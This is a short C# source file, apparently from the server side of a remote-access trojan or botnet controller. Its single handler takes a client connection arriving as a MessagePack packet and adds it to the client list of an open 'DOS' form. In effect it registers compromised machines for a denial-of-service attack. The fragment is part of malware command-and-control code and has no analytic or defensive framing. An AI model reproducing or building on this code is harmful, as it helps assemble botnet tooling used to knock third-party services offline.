using Server.Connection;
using Server.Forms;
using Server.MessagePack;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Server.Handle_Packet
{
    class HandleDos
    {
        public void Add(Clients client, MsgPack unpack_msgpack)
        {
            try
            {
                FormDOS DOS = (FormDOS)Application.OpenForms["DOS"];
                if (DOS != null)
                {
                    lock (DOS.sync)
                    DOS.PlguinClients.Add(client);
                }
            }
            catch { }
        }
    }
}
